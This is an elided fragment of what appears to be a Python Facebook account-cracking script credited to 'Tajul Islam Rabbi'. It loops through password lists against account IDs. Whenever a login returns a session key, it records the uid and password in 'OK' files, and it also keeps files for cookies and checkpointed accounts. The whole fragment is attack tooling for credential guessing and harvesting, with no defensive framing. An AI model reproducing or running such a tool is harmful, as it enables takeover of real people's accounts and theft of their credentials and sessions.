# Orignally Written By Tajul Islam Rabbi
...
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  Tajul Islam Rabbi
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  Tajul Islam Rabbi
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  SAX KING
	...
	try:
		...
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[RABBI-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'RABBI_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'RABBI_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [RABBI-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'RABBI-CP.txt')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [RABBI-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'RABBI_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
